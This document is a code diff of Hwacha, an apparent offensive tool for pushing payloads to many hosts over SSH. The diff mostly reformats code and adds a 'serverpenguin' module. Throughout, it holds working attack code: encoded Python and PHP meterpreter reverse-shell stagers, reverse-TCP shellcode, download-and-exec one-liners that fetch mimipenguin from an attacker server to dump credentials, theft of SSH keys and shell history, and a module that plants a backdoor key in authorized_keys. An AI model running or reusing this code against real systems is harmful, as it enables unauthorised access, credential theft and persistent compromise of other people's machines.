@@ -1,22 +1,23 @@
-import os
-import sys
-import time
+import SimpleHTTPServer
+import SocketServer
+import argparse
 import base64
-import thread
-import socket
+import os
+import paramiko
 import random
 import shutil
+import socket
 import string
-import paramiko
-import argparse
+import sys
+import thread
 import threading
-import SocketServer
-import SimpleHTTPServer
+import time
 from Crypto.PublicKey import RSA
 from netaddr import IPAddress, IPRange, IPNetwork, AddrFormatError
+
 CRED = '\033[91m'
 CEND = '\033[0m'
-CGREEN  = '\33[32m'
+CGREEN = '\33[32m'
 CYELLOW = '\33[33m'
 if not os.path.exists("logs"):
     os.makedirs("logs")
@@ -24,8 +25,8 @@ paramiko.util.log_to_file("logs/paramiko.log")
 
 
 def randomword(length):
-   letters = string.ascii_lowercase
-   return ''.join(random.choice(letters) for i in range(length))
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for _ in range(length))
 
 
 def connect(ip, username, password, identity_file):
@@ -65,7 +66,8 @@ def sudo_exec(ip, username, password, identity_file, file, timeout):
         sftp.put(file, filename)
         print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
         print CGREEN + "[!] Attempting to execute payload on " + str(ip) + "..." + CEND
-        stdin, stdout, stderr = client.exec_command(" chmod +x "+ filename + ";sudo ./" + filename, timeout=timeout, get_pty = True)
+        stdin, stdout, stderr = client.exec_command(" chmod +x " + filename + ";sudo ./" + filename, timeout=timeout,
+                                                    get_pty=True)
         if password:
             stdin.write(password + '\n')
             stdin.flush()
@@ -85,7 +87,8 @@ def copy_exec(ip, username, password, identity_file, file, timeout):
         sftp.put(file, filename)
         print CGREEN + "[+] Payload copied to " + str(ip) + "!" + CEND
         print CGREEN + "[!] Attempting to execute payload on " + str(ip) + "..." + CEND
-        stdin, stdout, stderr = client.exec_command(" chmod +x "+ filename +"; sleep 1; rm " + filename + " & ./" + filename, timeout=timeout)
+        stdin, stdout, stderr = client.exec_command(
+            " chmod +x " + filename + "; sleep 1; rm " + filename + " & ./" + filename, timeout=timeout)
         try:
             for line in stdout:
                 print line
@@ -139,7 +142,7 @@ def execute_command(ip, username, password, identity_file, command, timeout):
 def check_privs(ip, username, password, identity_file, timeout):
     client = connect(ip, username, password, identity_file)
     try:
-        if client != False:
+        if client:
             stdin, stdout, stderr = client.exec_command("sudo --list", timeout=timeout, get_pty=True)
             if password:
                 stdin.write(password + '\n')
@@ -157,15 +160,15 @@ def check_privs(ip, username, password, identity_file, timeout):
 def start_thread(targets, function, args):
     for ip in targets:
         if function == "execute_command":
-            t = threading.Thread(target=execute_command, args=(ip,args[1],args[2],args[3],args[4],args[5]))
+            t = threading.Thread(target=execute_command, args=(ip, args[1], args[2], args[3], args[4], args[5]))
             t.start()
         time.sleep(.2)
         if function == "copy_exec":
-            t = threading.Thread(target=copy_exec, args=(ip, args[1], args[2], args[3], args[4],args[5]))
+            t = threading.Thread(target=copy_exec, args=(ip, args[1], args[2], args[3], args[4], args[5]))
             t.start()
         time.sleep(.2)
         if function == "steal":
-            t = threading.Thread(target=steal, args=(ip, args[1], args[2], args[3], args[4],args[5]))
+            t = threading.Thread(target=steal, args=(ip, args[1], args[2], args[3], args[4], args[5]))
             t.start()
         time.sleep(.2)
         if function == "check_privs":
@@ -175,9 +178,11 @@ def start_thread(targets, function, args):
         if function == "login":
             t = threading.Thread(target=connect, args=(ip, args[1], args[2], args[3]))
             t.start()
+        time.sleep(.2)
         if function == "sudo_exec":
             t = threading.Thread(target=sudo_exec, args=(ip, args[1], args[2], args[3], args[4], args[5]))
             t.start()
+    return t
 
 
 def stager_meterpreter_python(listen_ip, listen_port, targets, port, username, password, identity_file):
@@ -198,14 +203,14 @@ exec(d,{'s':s})
 
     ''' % (listen_ip, listen_port)
     payload = base64.b64encode(stager, 'utf-8')
-    print CGREEN + "Attempting to execute meterpreter... \nHandler: " + str(listen_ip) + ":" + str(listen_port) + " \nPayload: python/meterpreter/reverse_tcp" + CEND
+    print CGREEN + "Attempting to execute meterpreter... \nHandler: " + str(listen_ip) + ":" + str(
+        listen_port) + " \nPayload: python/meterpreter/reverse_tcp" + CEND
     command = "echo \"import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('" + payload + "'))) \" | python &"
     start_thread(targets, "execute_command", [22, username, password, identity_file, command, 1])
 
 
 def stager_meterpreter_php(listen_ip, listen_port, targets, port, username, password, identity_file):
-
-        stager = '''
+    stager = '''
     error_reporting(0);
     $ip   = '%s';
     $port = %s;
@@ -258,15 +263,17 @@ def stager_meterpreter_php(listen_ip, listen_port, targets, port, username, pass
     die();
 
     ''' % (listen_ip, listen_port)
-        payload = base64.b64encode(stager, 'utf-8')
-        print CGREEN + "Attempting to execute meterpreter... \nHandler: " + str(listen_ip) + ":" + str(listen_port) + " \nPayload: php/meterpreter/reverse_tcp" + CEND
-        command = "php -r 'eval(base64_decode(\"" + payload + "\"));'"
-        start_thread(targets, "execute_command", [22, username, password, identity_file, command, 1])
+    payload = base64.b64encode(stager, 'utf-8')
+    print CGREEN + "Attempting to execute meterpreter... \nHandler: " + str(listen_ip) + ":" + str(
+        listen_port) + " \nPayload: php/meterpreter/reverse_tcp" + CEND
+    command = "php -r 'eval(base64_decode(\"" + payload + "\"));'"
+    start_thread(targets, "execute_command", [22, username, password, identity_file, command, 1])
 
 
-def start_server(a,PORT):
+def start_server(a, PORT):
     Handler = SimpleHTTPServer.SimpleHTTPRequestHandler
-    httpd = SocketServer.TCPServer(("", PORT), Handler)
+    SocketServer.ThreadingTCPServer.allow_reuse_address = True
+    httpd = SocketServer.ThreadingTCPServer(("", PORT), Handler)
     print "serving at port", PORT
     httpd.serve_forever()
 
@@ -278,11 +285,20 @@ def get_ip():
     return local_ip
 
 
+def serverpenguin(lhost, lport, targets, port, username, password, identity_file):
+    print CGREEN + "[!] Spinning up HTTP server..." + CEND
+    command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://" + str(
+        lhost) + ":" + str(lport) + "/payloads/mimipenguin.py'); exec(r.read());\" | python &"
+    print CGREEN + "[!] Executing mimipenguin via single server on the target, this may take a while..." + CEND
+    start_thread(targets, "execute_command", [22, username, password, identity_file, command, 300])
+
+
 def mimipenguin(lhost, lport, targets, port, username, password, identity_file):
     print CGREEN + "[!] Spinning up HTTP server..." + CEND
     thread.start_new_thread(start_server, ('MyStringHere', int(lport)))
     time.sleep(3)
-    command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://"+ str(lhost) + ":" + str(lport) + "/payloads/mimipenguin.py'); exec(r.read());\" | python &"
+    command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://" + str(
+        lhost) + ":" + str(lport) + "/payloads/mimipenguin.py'); exec(r.read());\" | python &"
     print CGREEN + "[!] Executing mimipenguin on the targets, this may take a while..." + CEND
     start_thread(targets, "execute_command", [22, username, password, identity_file, command, 300])
 
@@ -292,7 +308,8 @@ def web_delivery(lhost, lport, targets, port, username, password, identity_file,
     print CGREEN + "[!] Spinning up HTTP server..." + CEND
     thread.start_new_thread(start_server, ('MyStringHere', int(lport)))
     time.sleep(3)
-    command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://"+ str(lhost) + ":" + str(lport) + "/payloads/custom.py'); exec(r.read());\" | python &"
+    command = "echo \"import sys; u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://" + str(
+        lhost) + ":" + str(lport) + "/payloads/custom.py'); exec(r.read());\" | python &"
     print CGREEN + "[!] Executing payload on the targets..." + CEND
     start_thread(targets, "execute_command", [22, username, password, identity_file, command, 10])
 
@@ -301,13 +318,13 @@ def add_key_backdoor(targets, port, username, password, identity_file):
     name = randomword(4)
     print CGREEN + "[!] Generating RSA key pair..." + CEND
     key = RSA.generate(2048)
-    with open("payloads/"+ name + "_private.key", 'w') as content_file:
-        os.chmod("payloads/"+ name + "_private.key", 0600)
+    with open("payloads/" + name + "_private.key", 'w') as content_file:
+        os.chmod("payloads/" + name + "_private.key", 0600)
         print CYELLOW + "[*] payloads/" + name + "_private.key created" + CEND
         content_file.write(key.exportKey('PEM'))
         print CYELLOW + "[*] payloads/" + name + "_private.key created" + CEND
     pubkey = key.publickey()
-    with open("payloads/"+ name + "_public.key", 'w') as content_file:
+    with open("payloads/" + name + "_public.key", 'w') as content_file:
         content_file.write(pubkey.exportKey('OpenSSH'))
     key = pubkey.exportKey('OpenSSH')
     command = "echo \"" + key + "\" >> ~/.ssh/authorized_keys"
@@ -346,7 +363,7 @@ def parse_targets(target):
         return [t.strip()]
 
 
-def shellcode_meterpreter_64(port,ip):
+def shellcode_meterpreter_64(port, ip):
     hex_port = make_port(port)
     hex_ip = make_ip(ip)
     shellcode = '\\x48\\x31\\xff\\x6a\\x09\\x58\\x99\\xb6\\x10\\x48\\x89\\xd6\\x4d'
@@ -362,12 +379,12 @@ def shellcode_meterpreter_64(port,ip):
     return shellcode
 
 
-def shellcode_meterpreter_32(port,ip):
+def shellcode_meterpreter_32(port, ip):
     hex_port = make_port(port)
     hex_ip = make_ip(ip)
     shellcode = "\\x6a\\x0a\\x5e\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\xb0"
-    shellcode += "\\x66\\x89\\xe1\\xcd\\x80\\x97\\x5b\\x68" +  hex_ip + "\\x68"
-    shellcode += "\\x02\\x00" + hex_port  + "\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x57\\x89"
+    shellcode += "\\x66\\x89\\xe1\\xcd\\x80\\x97\\x5b\\x68" + hex_ip + "\\x68"
+    shellcode += "\\x02\\x00" + hex_port + "\\x89\\xe1\\x6a\\x66\\x58\\x50\\x51\\x57\\x89"
     shellcode += "\\xe1\\x43\\xcd\\x80\\x85\\xc0\\x79\\x19\\x4e\\x74\\x3d\\x68\\xa2"
     shellcode += "\\x00\\x00\\x00\\x58\\x6a\\x00\\x6a\\x05\\x89\\xe3\\x31\\xc9\\xcd"
     shellcode += "\\x80\\x85\\xc0\\x79\\xbd\\xeb\\x27\\xb2\\x07\\xb9\\x00\\x10\\x00"
@@ -381,7 +398,8 @@ def shellcode_meterpreter_32(port,ip):
 def build_macho(m_ip, m_port):
     with open('templates/meterpreter_baseline', 'r') as file:
         filedata = file.read()
-    filedata = filedata.replace('100.100.100.100:65535\"\x20', m_ip + ':' + m_port + '\"\x20' + (20 - len(m_ip+m_port)) * "\x00")
+    filedata = filedata.replace('100.100.100.100:65535\"\x20',
+                                m_ip + ':' + m_port + '\"\x20' + (20 - len(m_ip + m_port)) * "\x00")
     return filedata
 
 
@@ -411,7 +429,7 @@ fn()
 
 
 def make_ip(ip_address):
-    ip_address =ip_address.split(".")
+    ip_address = ip_address.split(".")
     hex_ip = ""
     for octet in ip_address:
         hex_ip += ('\\x' + str(hex(int(octet)))[2:4].zfill(2))
@@ -442,27 +460,30 @@ def print_modules():
     print ""
     print CRED + "Available Modules:" + CEND
     print CYELLOW + "[*] meterpreter" + CEND + "               Use this to execute a meterpreter agent on the target(s)."
-    print    "                                  REQUIRED ARGUMENTS: LHOST, LPORT"
+    print    "                              REQUIRED ARGUMENTS: LHOST, LPORT"
     print "                                 OPTIONAL ARGUMENTS: TYPE {python, php, 32, 64, osx}"
     print CYELLOW + "[*] mimipenguin" + CEND + "               Use this to execute a mimipenguin on the target(s) to recover credentials.  (Requires root)"
     print "                                 OPTIONAL ARGUMENTS: LISTEN, LHOST"
+    print CYELLOW + "[*] serverpenguin" + CEND + "             Use this to execute mimipenguin on couple of targets simultaneously with a single listening server. (Requires root)"
+    print "                                 Make sure you start the \'hwacha_listener.py\' script before using this module!"
+    print "                                 REQUIRED ARGUMENTS: LISTEN, LHOST"
     print CYELLOW + "[*] keys" + CEND + "                      Use this to collect SSH private keys from the target(s)."
     print CYELLOW + "[*] history" + CEND + "                   Use this to collect shell history files from the target(s)."
-    print CYELLOW +  "[*] privs" + CEND + "                     Use this to enumerate sudo privileges on the targets(s)."
-    print CYELLOW +  "[*] backdoor" + CEND + "                  Creates an RSA key pair and adds public key to authorized_keys file on targets(s)."
+    print CYELLOW + "[*] privs" + CEND + "                     Use this to enumerate sudo privileges on the targets(s)."
+    print CYELLOW + "[*] backdoor" + CEND + "                  Creates an RSA key pair and adds public key to authorized_keys file on targets(s)."
     print CYELLOW + "[*] web_delivery" + CEND + "              Use this to execute a python script on the target(s)."
-    print    "                                  REQUIRED ARGUMENTS: PATH"
+    print    "                              REQUIRED ARGUMENTS: PATH"
     print "                                 OPTIONAL ARGUMENTS: LISTEN"
     print CYELLOW + "[*] custom_bin" + CEND + "                Use this to execute a custom binary on the target(s)."
-    print    "                                  REQUIRED ARGUMENTS: PATH"
+    print    "                              REQUIRED ARGUMENTS: PATH"
     print CYELLOW + "[*] sudo_exec" + CEND + "                 Use this to execute a custom binary (with sudo) on the target(s)."
-    print    "                                  REQUIRED ARGUMENTS: PATH"
+    print    "                              REQUIRED ARGUMENTS: PATH"
     print CYELLOW + "[*] shellcode" + CEND + "                 Use this to execute custom shellcode on the target(s)."
-    print    "                                  REQUIRED ARGUMENTS: PATH"
+    print    "                              REQUIRED ARGUMENTS: PATH"
 
 
 def banner():
-    art = CGREEN +  """    &&&&     &&         &&        &&
+    art = CGREEN + """    &&&&     &&         &&        &&
 &&&&&&&&&&&& &&         &&        &&      Created by Esteban Rodriguez   /~~\_
    &&&&&&    &&     &&&&&&&&&&    &&	  Web: https://www.n00py.io     /| '` *\\
   &&    &&   &&&&&      &&        &&&&&        Twitter: @n00py1         \|  ___/
@@ -479,9 +500,9 @@ def main():
     parser = argparse.ArgumentParser(description='Hwacha, a tool for sending payloads en masse via SSH')
     parser.add_argument('-t', '--target', help='IP Address, IP range, or subnet', required=False, default=False)
     parser.add_argument('-u', '--username', help='SSH username', required=False, default=False)
-    parser.add_argument('-p', '--password',help='SSH password', required=False, default=False)
+    parser.add_argument('-p', '--password', help='SSH password', required=False, default=False)
     parser.add_argument('-i', '--identity_file', help='SSH key path', required=False, default=False)
-    parser.add_argument('-x', '--command',help='Command to execute', required=False)
+    parser.add_argument('-x', '--command', help='Command to execute', required=False)
     parser.add_argument('-m', '--module', help='Module to run', required=False)
     parser.add_argument('-o', '--options', help='Options for module', required=False)
     parser.add_argument('-L', '--list', help='List available modules and options', required=False, action='store_true')
@@ -499,21 +520,42 @@ def main():
         start_thread(targets, "login", [22, args.username, args.password, args.identity_file, 1])
     if args.command:
         print CGREEN + "[!] Running custom command " + "\"" + args.command + "\"..." + CEND
-        start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, args.command, 10])
+        start_thread(targets, "execute_command",
+                     [22, args.username, args.password, args.identity_file, args.command, 10])
     if args.options:
         options = dict(x.split('=') for x in args.options.split(' '))
 
-    if args.module == "mimipenguin":
+    if args.module == 'serverpenguin':
         if not args.options:
-            lport = 8080
+            print "The module requires options, You must supply LHOST and LISTEN"
+            print "Change the listening web server port with the LISTEN option"
+            print "Change the listening web server IP with the LHOST option"
+            exit()
         else:
             try:
                 lport = options['LISTEN']
+                lhost = options['LHOST']
+            except KeyError:
+                print "Change the listening web server port with the LISTEN option"
+                print "Change the listening web server IP with the LHOST option"
+                exit()
+        serverpenguin(lhost, lport, targets, 22, args.username, args.password, args.identity_file)
+
+    if args.module == "mimipenguin":
+        lport = 8080
+        if not args.options:
+            print "Getting machine's IP address..."
+            lhost = get_ip()
+        else:
+            try:
                 if 'LHOST' not in options:
                     print "Getting machine's IP address..."
                     lhost = get_ip()
+                elif 'LPORT' not in options:
+                    lhost = options['LHOST']
                 else:
                     lhost = options['LHOST']
+                    lport = options['LPORT']
             except KeyError:
                 print "Change the listening web server port with the LISTEN option"
                 print "Change the listening web server IP with the LHOST option"
@@ -570,7 +612,7 @@ def main():
 
     if args.module == "privs":
         print CGREEN + "[!] Checking sudo permissions..." + CEND
-        start_thread(targets, "check_privs",[22, args.username, args.password, args.identity_file, 10])
+        start_thread(targets, "check_privs", [22, args.username, args.password, args.identity_file, 10])
 
     if args.module == "shellcode":
         if not args.options:
@@ -611,8 +653,8 @@ def main():
             stager_meterpreter_php(m_ip, m_port, targets, 22, args.username, args.password, args.identity_file)
         if type == '64':
             command = invoke_shellcode(shellcode_meterpreter_64(m_port, m_ip))
-            print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port)\
-                + " \nPayload: linux/x64/meterpreter/reverse_tcp" + CEND
+            print CGREEN + "Attempting to execute meterpreter shellcode... \nHandler: " + str(m_ip) + ":" + str(m_port) \
+                  + " \nPayload: linux/x64/meterpreter/reverse_tcp" + CEND
             start_thread(targets, "execute_command", [22, args.username, args.password, args.identity_file, command, 2])
         if type == '32':
             command = invoke_shellcode(shellcode_meterpreter_32(m_port, m_ip))
@@ -637,9 +679,9 @@ def main():
                 os.makedirs("output")
             with open('output/' + filename, 'w') as file:
                 file.write(payload)
-            start_thread(targets, "copy_exec", [22, args.username, args.password, args.identity_file, 'output/' + filename, 2])
+            start_thread(targets, "copy_exec",
+                         [22, args.username, args.password, args.identity_file, 'output/' + filename, 2])
 
 
 if __name__ == "__main__":
-
     main()
